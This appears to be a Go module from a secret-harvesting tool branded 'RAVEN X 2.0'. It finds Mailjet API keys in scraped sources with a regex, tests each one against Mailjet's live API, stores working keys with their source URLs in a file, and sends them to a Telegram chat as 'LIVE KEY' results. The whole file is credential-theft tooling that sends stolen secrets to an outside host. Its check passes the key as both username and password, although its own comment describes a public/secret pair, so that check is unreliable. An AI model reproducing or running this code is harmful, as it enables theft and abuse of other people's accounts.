package main

import (
	"fmt"
	"net/http"
	"regexp"
)

// Mailjet uses a public API key + private secret key pair, both 32-char hex.
// The pattern matches the public key shape; the validator uses basic auth
// (publicKey:secretKey). For credentials found in pairs we treat any
// 32-char hex string preceded by `mailjet` context as a public-key candidate.
// Covers both canonical MAILJET_* env names and the shorter MJ_APIKEY_* aliases
// used by Mailjet's own official SDKs and .env templates.
var mailjetPattern = regexp.MustCompile(`(?i)(?:mailjet[_\-]?(?:api[_\-]?)?(?:key|public|secret)|MJ_APIKEY_(?:PUBLIC|PRIVATE)|MJ_APIKEY)["'\s:=]+([0-9a-f]{32})`)

// CheckMailjet validates a Mailjet API key against the user endpoint.
// Uses the key as both user and password for best-effort validation —
// only a 200 confirms a valid key.
func (a *AWSScanner) CheckMailjet(key, sourceURL string) bool {
	if !a.Config.APIValidation.Mailjet {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, err := http.NewRequest("GET", "https://api.mailjet.com/v3/REST/user", nil)
	if err != nil {
		return false
	}
	req.SetBasicAuth(key, key)
	req.Header.Set("Accept", "application/json")

	resp, err := do429Retry(client, req, 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		a.logValid("Mailjet", fmt.Sprintf("Key: %s", key))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_mailjet.txt")
		a.storeValidKeyLimit("Mailjet", key, "Active")

		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()

		msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
✈️ <b>MAILJET LIVE KEY</b>

🔑 <b>Key:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
		go a.sendTelegram(msg)
		return true
	}
	return false
}
